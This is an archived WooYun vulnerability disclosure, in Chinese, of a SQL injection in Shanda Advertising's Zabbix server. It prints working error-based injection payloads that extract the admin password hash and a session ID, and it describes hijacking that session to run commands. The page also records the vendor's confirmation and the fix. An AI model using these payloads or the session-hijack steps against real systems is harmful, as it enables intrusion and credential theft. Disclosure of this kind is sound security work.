@@ -1,0 +1,223 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		盛大广告ZabbixSQL注入导致命令执行  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		盛大广告ZabbixSQL注入导致命令执行  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/猪是念着倒V">猪是念着倒V</a> 
+</li><li>提交时间：		2013-10-19 16:26</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-10-19：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-10-20：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-10-21：	厂商提前公开漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">盛大广告ZabbixSQL注入导致命令执行</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">盛大广告 Zabbix地址 http://zabbix.sa.snyu.com/<br />
+<br />
+guest没禁用 先用guest直接登陆<br />
+<br />
+</p><p class="detail"><a href="../images/19142603437136244b30a5528619f67f1a96056b.jpg" target="_blank"><img src="../images/19142603437136244b30a5528619f67f1a96056b.jpg" alt="QQ图片20131019002005.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+然后来到这里 检测发现报错<br />
+<br />
+</p><p class="detail"><a href="../images/19142650fb232e67f314da713eda1221cbc3ad91.jpg" target="_blank"><img src="../images/19142650fb232e67f314da713eda1221cbc3ad91.jpg" alt="QQ图片20131019002139.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+尝试构造语句注入<br />
+<br />
+</p><pre><code>httpmon.php?applications=2 and (select 1 from (select count(*),concat((select(select concat(cast(concat(alias,0x7e,passwd,0x7e) as char),0x7e)) from zabbix.users LIMIT 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</code></pre><p class='detail'><br />
+<br />
+爆出干货 <br />
+<br />
+</p><p class="detail"><a href="../images/191427545c56de8ce3262323440b951f3a521674.jpg" target="_blank"><img src="../images/191427545c56de8ce3262323440b951f3a521674.jpg" alt="QQ图片20131019002538.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+adnin 21bf5f24883e20465a9876c4aa8a4dc9<br />
+<br />
+无奈小弟能力有限 21bf5f24883e20465a9876c4aa8a4dc9 MD5解不开 换个思路继续<br />
+<br />
+尝试cookie欺骗 构造语句<br />
+<br />
+</p><pre><code>httpmon.php?applications=2 and (select 1 from (select count(*),concat((select(select concat(cast(concat(sessionid,0x7e,userid,0x7e,status) as char),0x7e)) from zabbix.sessions where status=0 and userid=1 LIMIT 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</code></pre><p class='detail'><br />
+<br />
+爆出session<br />
+<br />
+</p><p class="detail"><a href="../images/19143033405eb30c85982d45be2895f10e1b3334.jpg" target="_blank"><img src="../images/19143033405eb30c85982d45be2895f10e1b3334.jpg" alt="QQ图片20131019143006.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+session:00afc31ea35f3f156ebb5c4b3b119be3<br />
+<br />
+然后进行欺骗 直接替换zbx_sessionid为这个00afc31ea35f3f156ebb5c4b3b119be3<br />
+<br />
+成功以administrator登陆<br />
+<br />
+</p><p class="detail"><a href="../images/19143245eac5f6647197d10f0cadc907b203733d.jpg" target="_blank"><img src="../images/19143245eac5f6647197d10f0cadc907b203733d.jpg" alt="QQ图片20131019143236.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+再来到这里 指令随意改<br />
+<br />
+</p><p class="detail"><a href="../images/19143354ef3d60422fa417e5be13f33a5ca2ba52.jpg" target="_blank"><img src="../images/19143354ef3d60422fa417e5be13f33a5ca2ba52.jpg" alt="QQ图片20131019143348.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+然后来到这里 可以执行刚才设置的指令<br />
+<br />
+</p><p class="detail"><a href="../images/191435503c3a5b9aa30b122c41de218f0633b701.jpg" target="_blank"><img src="../images/191435503c3a5b9aa30b122c41de218f0633b701.jpg" alt="QQ图片20131019143541.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+就到这里了 继续的话你懂得 我就不试了.<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/19144057b0750638b047f0200b4f36d61db7dad5.jpg" target="_blank"><img src="../images/19144057b0750638b047f0200b4f36d61db7dad5.jpg" alt="QQ图片20131019002538.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/19144104e8c0f869ba2566c1b63c20d39147bb4d.jpg" target="_blank"><img src="../images/19144104e8c0f869ba2566c1b63c20d39147bb4d.jpg" alt="QQ图片20131019143006.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">过滤~<br />
+<br />
+<br />
+<br />
+你比我懂~<br />
+<br />
+<br />
+<br />
+求Rank~ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/猪是念着倒V" title="猪是念着倒V">猪是念着倒V</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-040304" title="盛大广告ZabbixSQL注入导致命令执行">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2013-10-20 11:22</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">正在联系进行修复，感谢提交。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+																	<p class="detail">2013-10-21：已于10.20完成修复，感谢 猪是念着倒V </p>
+											
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="40304";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
